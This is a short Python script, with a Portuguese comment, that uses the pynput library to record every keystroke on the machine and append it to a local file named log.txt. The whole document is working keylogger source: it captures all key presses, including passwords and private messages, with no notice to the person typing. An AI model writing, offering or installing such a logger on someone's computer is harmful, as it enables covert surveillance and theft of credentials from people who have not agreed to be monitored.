#"pip install pynput"
from pynput.keyboard import Listener

def writetofile(key):
    keydata = str(key)
    keydata = keydata.replace("'","")
    with open("log.txt","a") as f:
        f.write(keydata)

#esta é a função para gravar a tecla pressionada e salvá-la como log.txt

with Listener(on_press=writetofile) as l:
    l.join()